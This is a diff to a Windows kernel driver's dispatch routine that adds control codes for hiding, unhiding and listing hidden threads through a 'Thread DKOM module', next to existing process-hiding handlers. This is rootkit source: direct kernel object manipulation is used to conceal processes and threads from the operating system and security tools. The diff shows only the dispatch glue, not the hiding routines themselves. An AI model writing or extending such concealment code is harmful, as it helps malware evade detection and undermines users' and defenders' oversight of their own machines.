@@ -1,5 +1,6 @@
 #include "Dispatch.h"
 #include "ProcessModule.h"
+#include "ThreadModule.h"
 #include "Shared.h"
 #include <ntddk.h>
 
@@ -111,6 +112,41 @@ NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
     if (outputLength == sizeof(PROCESS_LIST_RESPONSE)) {
       status = ProcessListHidden((PPROCESS_LIST_RESPONSE)outputBuffer);
       bytesReturned = sizeof(PROCESS_LIST_RESPONSE);
+    } else {
+      status = STATUS_INVALID_BUFFER_SIZE;
+    }
+    break;
+
+  // ------------------------------------------------------
+  // Thread DKOM module (see ProcessModule.c)
+  // ------------------------------------------------------
+  case IOCTL_HIDE_THREAD:
+    DbgPrint("HIDE_THREAD requested.\n");
+    if (inputLength == sizeof(THREAD_REQUEST)) {
+      PTHREAD_REQUEST req = (PTHREAD_REQUEST)inputBuffer;
+      status = ThreadHide(req->ThreadId);
+      bytesReturned = 0;
+    } else {
+      status = STATUS_INVALID_BUFFER_SIZE;
+    }
+    break;
+
+  case IOCTL_UNHIDE_THREAD:
+    DbgPrint("UNHIDE_THREAD requested.\n");
+    if (inputLength == sizeof(THREAD_REQUEST)) {
+      PTHREAD_REQUEST req = (PTHREAD_REQUEST)inputBuffer;
+      status = ThreadUnhide(req->ThreadId);
+      bytesReturned = 0;
+    } else {
+      status = STATUS_INVALID_BUFFER_SIZE;
+    }
+    break;
+
+  case IOCTL_LIST_HIDDEN_THREADS:
+    DbgPrint("LIST_HIDDEN_THREADS requested.\n");
+    if (outputLength == sizeof(THREAD_LIST_RESPONSE)) {
+      status = ThreadListHidden((PTHREAD_LIST_RESPONSE)outputBuffer);
+      bytesReturned = sizeof(THREAD_LIST_RESPONSE);
     } else {
       status = STATUS_INVALID_BUFFER_SIZE;
     }
